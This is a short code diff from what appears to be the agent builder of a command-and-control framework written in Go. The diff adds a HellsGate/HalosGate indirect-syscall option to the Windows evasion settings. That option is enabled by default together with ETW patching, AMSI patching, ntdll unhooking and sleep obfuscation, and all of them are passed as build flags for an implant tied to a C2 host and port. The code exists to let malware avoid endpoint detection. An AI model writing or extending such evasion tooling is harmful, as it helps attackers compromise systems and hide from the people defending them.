@@ -57,6 +57,8 @@ type EvasionOpts struct {
 	UnhookNtdll      bool
 	ETWPatch         bool
 	AMSIPatch        bool
+	IndirectSyscall  bool   // HellsGate/HalosGate indirect syscall engine
+	SyscallMethod    string // "auto" | "hellsgate" | "halosgate"
 }
 
 // PosixEvasionOpts holds compile-time evasion toggles (Linux/macOS).
@@ -138,15 +140,33 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 		outFile = "agent_macos"
 
 	default: // Windows
-		ev := EvasionOpts{SleepObfuscation: true, UnhookNtdll: true, ETWPatch: true, AMSIPatch: true}
+		ev := EvasionOpts{
+			SleepObfuscation: true,
+			UnhookNtdll:      true,
+			ETWPatch:         true,
+			AMSIPatch:        true,
+			IndirectSyscall:  true,
+			SyscallMethod:    "auto",
+		}
 		if evasion != nil {
 			ev = *evasion
+		}
+		syscallMethodInt := 0
+		switch strings.ToLower(ev.SyscallMethod) {
+		case "hellsgate":
+			syscallMethodInt = 1
+		case "halosgate":
+			syscallMethodInt = 2
+		default:
+			syscallMethodInt = 0 // auto
 		}
 		env = append(env,
 			"ENABLE_ETW_PATCH="+boolToFlag(ev.ETWPatch),
 			"ENABLE_AMSI_PATCH="+boolToFlag(ev.AMSIPatch),
 			"ENABLE_SLEEP_ENCRYPT="+boolToFlag(ev.SleepObfuscation),
 			"ENABLE_UNHOOK="+boolToFlag(ev.UnhookNtdll),
+			"ENABLE_INDIRECT_SYSCALL="+boolToFlag(ev.IndirectSyscall),
+			fmt.Sprintf("SYSCALL_METHOD=%d", syscallMethodInt),
 		)
 		switch strings.ToLower(outputFormat) {
 		case "exe":
